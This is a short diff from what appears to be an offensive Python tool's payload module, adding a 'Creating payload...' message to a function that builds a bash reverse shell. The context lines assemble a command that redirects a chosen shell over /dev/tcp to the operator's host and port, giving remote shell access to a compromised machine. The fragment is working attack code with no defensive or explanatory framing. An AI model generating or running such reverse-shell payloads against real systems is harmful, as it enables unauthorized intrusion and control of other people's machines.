@@ -27,6 +27,7 @@ class payload:
 
 	def run(self,server):
 		shell = input(h.info_general_raw("Target shell: ")).strip(" ")
+		h.info_general("Creating payload...")
 		payload = shell+" &> /dev/tcp/"+server.host+"/"+str(server.port)+" 0>&1"
 		backend = len(payload)
 		print(h.WHITE + "-"*backend + h.ENDC)
